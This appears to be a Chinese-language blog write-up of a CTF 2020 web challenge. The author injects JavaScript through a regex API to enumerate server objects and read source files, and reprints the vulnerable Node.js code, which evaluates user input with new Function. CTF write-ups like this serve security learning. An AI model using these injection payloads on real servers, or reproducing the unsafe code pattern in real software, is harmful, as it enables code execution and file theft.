---
title: 為什麼不要信任使用者輸入 (CyberSecurityREGEX)
categories:
    - 資安技術
date: 2020-11-15 21:35:36
tags:
    - Flag Hunter
---

CyberSecurityRumble CTF 2020 已經過去幾周了, 因個人能力問題, 我沒能拿到多少 Flag. 不過部落格也長草許久, 今天就回顧一下其中的一個挑戰 —— CyberSecurityREGEX.

<!--more-->

![](afaaa943325e04b50949509766cede2f0bea3078.png)

看到此挑戰的第一時間, 我立刻意識到應該與使用者輸入驗證不嚴格有關. 同隊的 Linnaea 猜測伺服器是 NodeJS, 經過測試果然如此. <del>後來我才發現頁面上已經明確告知伺服器是 JavaScript 編寫的</del>

测试用例如下:

```js
'; return Object.getOwnPropertyNames(this); //
```

![](1513030f4499fd7dd62d1e00632e98410ce4a700.png)

`simpleFs` 引起了我的興趣, 仔細看看:

```js
'; return Object.getOwnPropertyNames(this.simpleFs); //
```

Result:

```json
{
  "result": [ "length", "prototype", "exists", "readFile", "readFileSync", "writeFile", "writeFileSync", "appendFile", "appendFileSync", "name" ]
}
```

繼續嘗試:

```js
'; return this.simpleFs.readFileSync('index.js'); //
```

Result:

```json
{
  "result": "var express = require('express');\nvar cors = require('cors');\n\nvar app = express();\nvar api = require('./api')\n\napp.use(cors());\n\nprocess.on('unhandledRejection', (reason, promise) => {\n    console.log('Unhandled Rejection at:', reason.stack || reason)\n})\n\n\nprocess.on('uncaughtException', function (err) {\n    console.error(err.stack);\n});\n\napp.use((req, res, next) => {\n    res.header('Server', 'dunno');\n    res.header('X-Powered-By', 'love <3');\n    res.header('Level', (9000 + Math.random() * 1000).toFixed(0));\n    next();\n});\n\n//Static\napp.use(express.static('dist'));\n\n//rest\napp.use('/api', api);\n\n//Troll\napp.use('/admin', function (req, res) {\n    res.status(401).send();\n});\napp.use('/phpMyAdmin', function (req, res) {\n    res.status(402).send();\n});\napp.use('/test.php', function (req, res) {\n    res.status(403).send();\n});\n\n//Custom 404\napp.get('*', function (req, res) {\n    res.status(404).send('notfound.jpeg');\n});\n\napp.listen(8080, () => {\n    console.log(`Listening...`)\n});"
}
```

利用此方法獲取到全部程式碼:

<details>
<summary>api.js</summary>

```js
var express = require('express');
var router = express.Router();
var RegexEr = require('./regexer')

router.get('/regex/:pattern/:flags/:input', (req, res) => {
 var params = {
 pattern: req.params.pattern,
 input: req.params.input,
 flags: req.params.flags
 };
 try {
 params.pattern = Buffer.from(req.params.pattern, 'base64').toString();
 params.input = Buffer.from(req.params.input, 'base64').toString().replace(/\\n/gm, '').trim();
 params.flags = Buffer.from(req.params.flags, 'base64').toString();
 RegexEr.process(params.pattern, params.flags, params.input)
 .then((result) => res.status(200).send({result: result}))
 .catch((err) => res.status(400).send({ error: err.message }));

 } catch (ex) {
 console.error(ex);
 res.status(400).send(JSON.stringify(ex));
 }

});

module.exports = router;
```
</details>

<details>
<summary>index.js</summary>

```js
var express = require('express');
var cors = require('cors');

var app = express();
var api = require('./api')

app.use(cors());

process.on('unhandledRejection', (reason, promise) => {
 console.log('Unhandled Rejection at:', reason.stack || reason)
})

process.on('uncaughtException', function (err) {
 console.error(err.stack);
});

app.use((req, res, next) => {
 res.header('Server', 'dunno');
 res.header('X-Powered-By', 'love <3');
 res.header('Level', (9000 + Math.random() * 1000).toFixed(0));
 next();
});

//Static
app.use(express.static('dist'));

//rest
app.use('/api', api);

//Troll
app.use('/admin', function (req, res) {
 res.status(401).send();
});
app.use('/phpMyAdmin', function (req, res) {
 res.status(402).send();
});
app.use('/test.php', function (req, res) {
 res.status(403).send();
});

//Custom 404
app.get('*', function (req, res) {
 res.status(404).send('notfound.jpeg');
});

app.listen(8080, () => {
 console.log(`Listening...`)
});
```
</details>

<details>
<summary>leftover.js</summary>

```js
class Utility {
 require(resource) {
 return new Promise((res, rej)=>{
 try {
 var module = require(resource);
 return res(module);
 } catch(ex) {
 return rej(ex);
 }
 });
 }
 isRunningOnWindows() {
 return process.platform.indexOf('win' === 0);
 }
 getUrlHost(url) {
 try{
 return new URL(url).hostname;
 } catch(ex){
 return null;
 }
 }
}

LEGACY_UTILS = new Utility();

module.exports = LEGACY_UTILS;
```
</details>

<details>
<summary>regexer.js</summary>

```js
const sfs = require('./simple-fs');

const LOGFILE = 'requests.log';

class RegexEr {
 constructor() {
 this.simpleFs = sfs;
 }
 process(pattern, flags, input) {
 return new Promise((res, rej) => {
 try {
 var str = `var _result = '${input}'.match(/${pattern}/${flags}); return _result;`;
 this.addLogLine(LOGFILE, str + '\
');
 console.log(str);
 var fun = new Function(str);
 var result = fun.call(this);
 res(result);
 } catch (ex) {
 rej(ex);
 }
 });
 }
 addLogLine(logFile, content) {
 this.simpleFs.appendFile(logFile, content);
 }
}

const REGEXER_INSTANCE = new RegexEr();

module.exports = REGEXER_INSTANCE;
```
</details>

<details>
<summary>simple-fs.js</summary>

```js
const fs = require('fs');
const LEGACY_UTILS = require('./leftover')

class SimpleFs {
 static exists(path) {
 return new Promise((res, rej) => {
 fs.stat(path, (err, stats) => {
 if (err) return rej(err);
 if (!stats.isFile()) return rej('Not a file');
 return res();
 });
 });
 }

 static readFile(path) {
 return new Promise((res, rej) => {
 if (!fs.existsSync(path)) return rej('File not found');
 fs.readFile(path, { encoding: 'utf-8' }, (err, data) => {
 if (err) return rej(err);
 return res(data);
 });
 });
 }

 static readFileSync(path) {
 if (!fs.existsSync(path)) return rej('File not found');
 try {
 return fs.readFileSync(path, { encoding: 'utf-8' });
 } catch (ex) {
 return false;
 }
 }

 static writeFile(path, contents) {
 return new Promise((res, rej) => {
 if (fs.existsSync(path)) return rej('File already exists');
 fs.writeFile(path, contents, { encoding: 'utf-8' }, (err) => {
 if (err) return rej(err);
 return res();
 })
 });
 }

 static writeFileSync(path, contents) {
 if (fs.existsSync(path)) return rej('File already exists');
 try {
 fs.writeFileSync(path, contents, { encoding: 'utf-8' });
 return true;
 } catch (ex) {
 return false;
 }
 }

 static appendFile(path, contents) {
 return new Promise((res, rej) => {
 if (!fs.existsSync(path)) return rej('File not found');
 fs.appendFile(path, contents, { encoding: 'utf-8' }, (err) => {
 if (err) return rej(err);
 return res();
 });
 });
 }

 static appendFileSync(path, contents) {
 if (!fs.existsSync(path)) return rej('File not found');
 try {
 fs.appendFileSync(path, contents, { encoding: 'utf-8' });
 return true;
 } catch (ex) {
 return false;
 }
 }
}

module.exports = SimpleFs;
```
</details>

`regexer.js` 中可以看到:

```js
var str = `var _result = '${input}'.match(/${pattern}/${flags}); return _result;`;

var fun = new Function(str);
var result = fun.call(this);
```

果然沒有驗證使用者輸入.

`leftover.js` 中有 `LEGACY_UTILS = new Utility();`, 可以利用.

![](4023224da4e49318ec26a46e5660ebd20a062c5d.png)

更進一步, 拿到 Flag.

![](366485a0065f211ae8f7cdde0ec2cf27cb15ff0c.png)
